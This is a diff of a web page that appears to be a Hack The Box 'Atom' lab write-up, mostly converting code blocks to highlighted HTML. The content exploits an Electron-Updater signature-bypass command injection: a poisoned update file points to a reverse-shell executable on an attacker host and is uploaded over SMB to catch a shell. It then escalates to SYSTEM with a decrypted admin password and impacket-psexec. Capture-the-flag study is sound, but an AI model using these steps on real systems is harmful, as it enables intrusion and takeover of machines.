@@ -1146,28 +1146,28 @@ $ curl -s -k https://atom.htb/ <span class="p">|</span> wc -c
 <span class="m">7581</span>
 </code></pre></div><h3 id="analysis">Analysis</h3>
 <p>The previous zip file contains one executable file called <code>heedv1 Setup 1.0.0.exe</code>.</p>
-<pre><code>→ root@kali «loot» «10.10.14.49» 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «loot» «10.10.14.49» 
 $ file heedv1_setup_1.0.0.exe 
-heedv1_setup_1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive
-</code></pre><p>It says &ldquo;self-extracting archive&rdquo;, meaning it can be extracted, for example using <code>7z</code>.</p>
+heedv1_setup_1.0.0.exe: PE32 executable <span class="o">(</span>GUI<span class="o">)</span> Intel 80386, <span class="k">for</span> MS Windows, Nullsoft Installer self-extracting archive
+</code></pre></div><p>It says &ldquo;self-extracting archive&rdquo;, meaning it can be extracted, for example using <code>7z</code>.</p>
 <p>While looking into the app structure, I spotted a file called <code>app-update.yml</code>.</p>
-<pre><code>→ root@kali «heed_extracted» «10.10.14.49» 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
 $ tree
 .
-├── $PLUGINSDIR
+├── <span class="nv">$PLUGINSDIR</span>
 │   ├── app-64
 ...&lt;SNIP&gt;...
 │   │   ├── natives_blob.bin
 │   │   ├── resources
 │   │   │   ├── app.asar
-│   │   │   ├── app-update.yml # ==&gt; Updater config
+│   │   │   ├── app-update.yml <span class="c1"># ==&gt; Updater config</span>
 │   │   │   ├── electron.asar
 │   │   │   ├── elevate.exe
 │   │   │   └── inspector
 ...&lt;SNIP&gt;...
 
-73 directories, 274 files
-</code></pre><p>The file contains another hostname, which I&rsquo;ll add it to <code>/etc/hosts</code>.</p>
+<span class="m">73</span> directories, <span class="m">274</span> files
+</code></pre></div><p>The file contains another hostname, which I&rsquo;ll add it to <code>/etc/hosts</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
 $ cat ./<span class="se">\$</span>PLUGINSDIR/app-64/resources/app-update.yml
 provider: generic
@@ -1190,23 +1190,23 @@ $ curl -s http://updates.atom.htb/ <span class="p">|</span> wc -c
 <h3 id="shell-as-jason">Shell as Jason</h3>
 <h4 id="rce-electron-updater---background">RCE Electron-Updater - Background</h4>
 <p>I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the <code>app-update.yml</code> to point to my malicious <code>.exe</code> file and repack the app. I got the idea of poisoning the update file but didn&rsquo;t know where to start until I found this <a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">blog</a>.</p>
-<p>According to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check of the new version of binary file.</p>
-<pre><code>execFile(&quot;powershell.exe&quot;, [&quot;-NoProfile&quot;, &quot;-NonInteractive&quot;, &quot;-InputFormat&quot;, &quot;None&quot;, &quot;-Command&quot;, `Get-AuthenticodeSignature '${tempUpdateFile}' | ConvertTo-Json -Compress`], {
+<p>According to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check on the new version of binary file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">execFile(&#34;powershell.exe&#34;, [&#34;-NoProfile&#34;, &#34;-NonInteractive&#34;, &#34;-InputFormat&#34;, &#34;None&#34;, &#34;-Command&#34;, `Get-AuthenticodeSignature &#39;${tempUpdateFile}&#39; | ConvertTo-Json -Compress`], {
 ...&lt;SNIP&gt;...
-</code></pre><p>If <code>${tempUpdateFile}</code> is a user-controlled input, this can be leveraged for command injection: <code>';calc;'</code></p>
+</code></pre></div><p>If <code>${tempUpdateFile}</code> is a user-controlled input, this can be leveraged for command injection: <code>';calc;'</code></p>
 <blockquote>
 <p><em>Since the <code>${tempUpdateFile}</code> variable is provided unescaped to the <code>execFile</code> utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.</em></p>
 </blockquote>
 <p>The following is an example of malicious update definition that will pop a calculator.</p>
-<pre><code>version: 2.0.0
-path: u';calc;'pdate.exe
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">version: 2.0.0
+path: u&#39;;calc;&#39;pdate.exe
 sha512: qwP35Rn5PLaBoZ8tzvRFK...&lt;SNIP&gt;...LM3WCmvJUXMYmZGW6T+fI=
-releaseDate: '2021-01-24T13:44:59.064Z'
-</code></pre><p>Sending this <code>u';payload;'pdate.exe</code> as path would be troublesome, which is simplified as follows:</p>
-<pre><code>`Get-AuthenticodeSignature 'u';payload;'pdate.exe' | ConvertTo-Json -Compress`
-</code></pre><p>Now that if a single quote <code>'</code> is added to <code>path</code>, which becomes:</p>
-<pre><code>`Get-AuthenticodeSignature 'u'pdate.exe' | ConvertTo-Json -Compress`
-</code></pre><p>But then, it would breaks the signature verification.</p>
+releaseDate: &#39;2021-01-24T13:44:59.064Z&#39;
+</code></pre></div><p>Sending this <code>u';payload;'pdate.exe</code> as path would be troublesome, which is simplified as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">`Get-AuthenticodeSignature &#39;u&#39;;payload;&#39;pdate.exe&#39; | ConvertTo-Json -Compress`
+</code></pre></div><p>Now that if a single quote <code>'</code> is added to <code>path</code>, it becomes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">`Get-AuthenticodeSignature &#39;u&#39;pdate.exe&#39; | ConvertTo-Json -Compress`
+</code></pre></div><p>But then, the line above would breaks the signature verification.</p>
 <p>And here&rsquo;s come the interesting part, an attacker could easily bypass this signature verification by recalculating the hash of <code>u'pdate.exe</code>. That&rsquo;s very clever, right?</p>
 <h4 id="rce-electron-updater---exploitation">RCE Electron-Updater - Exploitation</h4>
 <p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote. But, I&rsquo;ll go with remote 😅.</p>
@@ -1224,31 +1224,31 @@ Saved as: i<span class="err">&#39;</span>amf.exe
 $ shasum -a <span class="m">512</span> i<span class="se">\&#39;</span>amf.exe <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1 <span class="p">|</span> xxd -r -p <span class="p">|</span> base64 <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span>
 Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw<span class="o">==</span>
 </code></pre></div><p>The last thing I need is the update file. I&rsquo;ll create one called <code>update-iamf.yml</code>  which contains the following update definitions:</p>
-<pre><code>version: 2.0.1
-path: http://10.10.14.83/i'amf.exe
-sha512: Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==
-releaseDate: '2021-01-24T13:44:59.064Z'
-</code></pre><p>I&rsquo;ll upload the update file to <code>Software_Updates</code> share using <code>smbclient</code>  and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.49» 
-$ smbclient -N //10.10.10.237/Software_Updates -c &#34;put iamf-update.yml client1/latest.yml&#34;  &amp;&amp; nc -nvlp 53
-putting file iamf-update.yml as \client1\latest.yml (1.1 kb/s) (average 1.1 kb/s)
-listening on [any] 53 ...
-connect to [10.10.14.49] from (UNKNOWN) [10.10.10.237] 64352
-Microsoft Windows [Version 10.0.19042.906]
-(c) Microsoft Corporation. All rights reserved.
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="m">2.0.1</span><span class="w">
+</span><span class="w"></span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">http://10.10.14.83/i&#39;amf.exe</span><span class="w">
+</span><span class="w"></span><span class="nt">sha512</span><span class="p">:</span><span class="w"> </span><span class="l">Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==</span><span class="w">
+</span><span class="w"></span><span class="nt">releaseDate</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;2021-01-24T13:44:59.064Z&#39;</span><span class="w">
+</span></code></pre></div><p>I&rsquo;ll upload the update file to <code>Software_Updates</code> share using <code>smbclient</code>  and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
+$ smbclient -N //10.10.10.237/Software_Updates -c <span class="s2">&#34;put iamf-update.yml client1/latest.yml&#34;</span>  <span class="o">&amp;&amp;</span> nc -nvlp <span class="m">53</span>
+putting file iamf-update.yml as <span class="se">\c</span>lient1<span class="se">\l</span>atest.yml <span class="o">(</span>1.1 kb/s<span class="o">)</span> <span class="o">(</span>average 1.1 kb/s<span class="o">)</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">64352</span>
+Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
+<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
 
-C:\WINDOWS\system32&gt;whoami
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
 whoami
-atom\jason
+atom<span class="se">\j</span>ason
 
-C:\WINDOWS\system32&gt;
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;
 </code></pre></div><p><img class="img-container" src="imgs/image-20210517220650699.png" alt="image-20210517220650699"  />
 </p>
 <p>User flag is done here.</p>
-<pre><code>C:\Users\jason\Desktop&gt;type user.txt
-type user.txt
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\j</span>ason<span class="se">\D</span>esktop&gt;type user.txt
+<span class="nb">type</span> user.txt
 b77e754354e186f...&lt;SNIP&gt;...
-</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="shell-as-system">Shell as SYSTEM</h3>
 <h4 id="internal-enumeration">Internal Enumeration</h4>
 <p>WinPEAS discovers a set of credentials for user <code>jason</code>.</p>
@@ -1338,25 +1338,25 @@ $ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
 <span class="o">[</span>+<span class="o">]</span> Decrypted Password: kidvscat_admin_@123
 </code></pre></div><h4 id="psexecpy">psexec.py</h4>
 <p>I could use the credentials in psexec from impacket to obtain interactive shell access as system.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «atom» «10.10.14.49» 
-$ impacket-psexec atom/administrator:&#39;kidvscat_admin_@123&#39;@10.10.10.237
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
+$ impacket-psexec atom/administrator:<span class="s1">&#39;kidvscat_admin_@123&#39;</span>@10.10.10.237
+Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
 
-[*] Requesting shares on 10.10.10.237.....
-[*] Found writable share ADMIN$
-[*] Uploading file FCSITnEj.exe
-[*] Opening SVCManager on 10.10.10.237.....
-[*] Creating service DCLl on 10.10.10.237.....
-[*] Starting service DCLl.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.19042.906]
-(c) Microsoft Corporation. All rights reserved.
+<span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.237.....
+<span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
+<span class="o">[</span>*<span class="o">]</span> Uploading file FCSITnEj.exe
+<span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.237.....
+<span class="o">[</span>*<span class="o">]</span> Creating service DCLl on 10.10.10.237.....
+<span class="o">[</span>*<span class="o">]</span> Starting service DCLl.....
+<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
+<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
 
-C:\WINDOWS\system32&gt;whoami &amp;&amp; hostname
-nt authority\system
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami <span class="o">&amp;&amp;</span> hostname
+nt authority<span class="se">\s</span>ystem
 ATOM
 
-C:\WINDOWS\system32&gt;ipconfig
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;ipconfig
 
 Windows IP Configuration
 
